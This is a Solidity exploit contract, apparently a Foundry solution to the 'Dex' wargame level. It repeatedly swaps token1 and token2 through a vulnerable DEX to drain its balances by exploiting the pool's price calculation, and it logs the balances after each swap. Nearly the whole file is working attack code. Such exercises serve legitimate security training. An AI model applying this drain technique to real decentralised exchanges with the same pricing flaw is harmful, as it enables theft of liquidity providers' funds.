// SPDX-License-Identifier: MIT
import "../../src/Dex/Dex.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

pragma solidity ^0.8.0;
contract DexExploit {

    Dex public victim;

    constructor(address payable _victim){
        victim = Dex(_victim);
    }

    function hack() public {
        address token1 = victim.token1();
        address token2 = victim.token2();

        uint amt_to_transfer = 10;

        for (int i = 0; i < 10; i++ ) {

            uint token1_bal_dex = victim.balanceOf(token1, address(victim));
            uint token2_bal_dex = victim.balanceOf(token2, address(victim));
            if (token1_bal_dex == 0 || token2_bal_dex == 0) {
                return;
            }

            victim.approve(address(victim), amt_to_transfer);
            victim.swap(token1, token2, amt_to_transfer);
            console.log("\t swap token1 to token2: %d", amt_to_transfer);
            ///////////////////////////////////

            uint token1_bal = victim.balanceOf(token1, address(this));
            uint token2_bal = victim.balanceOf(token2, address(this));

            token1_bal_dex = victim.balanceOf(token1, address(victim));
            token2_bal_dex = victim.balanceOf(token2, address(victim));
            if (token1_bal_dex == 0 || token2_bal_dex == 0) {
                return;
            }


            console.log("After the swap,user: the balance of token1 is: %d, token2 is: %d", token1_bal, token2_bal);
            console.log("After the swap,dex: the balance of token1 is: %d, token2 is: %d", token1_bal_dex, token2_bal_dex);

            victim.approve(address(victim),Math.min(token2_bal_dex, token2_bal));

            victim.swap(token2, token1, Math.min(token2_bal_dex, token2_bal));

            console.log("\t swap token2 to token1: %d", Math.min(token2_bal_dex, token2_bal));


            token1_bal = victim.balanceOf(token1, address(this));

            token2_bal = victim.balanceOf(token2, address(this));

            token1_bal_dex = victim.balanceOf(token1, address(victim));
            token2_bal_dex = victim.balanceOf(token2, address(victim));

            if (token1_bal_dex == 0 || token2_bal_dex == 0) {
                return;
            }

            amt_to_transfer = token1_bal;

            console.log("After the swap,user: the balance of token1 is: %d, token2 is: %d", token1_bal, token2_bal);
            console.log("After the swap,dex: the balance of token1 is: %d, token2 is: %d", token1_bal_dex, token2_bal_dex);


        }


        return;
        // for (uint i = 0; i < 10; i++) {

        //     victim.approve(address(victim), 10);

        //     victim.swap(token2, token1, 20);
        // }


    }

    receive() external payable {
    }
}